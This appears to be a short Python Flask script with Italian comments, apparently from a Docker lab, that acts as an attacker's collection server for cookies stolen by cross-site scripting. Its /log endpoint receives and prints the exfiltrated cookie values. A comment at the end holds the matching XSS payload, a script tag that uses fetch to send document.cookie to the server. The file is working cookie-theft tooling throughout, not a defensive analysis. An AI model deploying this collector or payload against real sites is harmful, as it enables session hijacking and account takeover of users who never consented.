from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

@app.route('/log')
def log():
    # 1. PUNTO DI RACCOLTA DATI: Estrae il cookie passato dall'attacco XSS via URL.
    cookie = request.args.get('cookie')
    timestamp = datetime.now().strftime("%H:%M:%S")
    
    print("\n" + "!"*60)
    print(f"[{timestamp}] DATI ESFILTRATI RICEVUTI!")
    # 2. VISUALIZZAZIONE: Stampa sul terminale dell'attaccante il cookie rubato.
    
    print(f"VALORE COOKIE: {cookie}")
    # 3. OUTPUT IMMEDIATO: 'flush=True' costringe Python a stampare subito a schermo nel terminale
    # senza accumulare i dati nel buffer fondamentale quando gira dentro i container Docker.
    
    print("!"*60 + "\n", flush=True)
    
    return "Dati ricevuti con successo", 200

if __name__ == '__main__':
    # Gira sulla porta 9090
    app.run(host='0.0.0.0', port=9090)
    
    
    #<script>fetch('http://localhost:9090/log?cookie=' + document.cookie);</script>
    
    


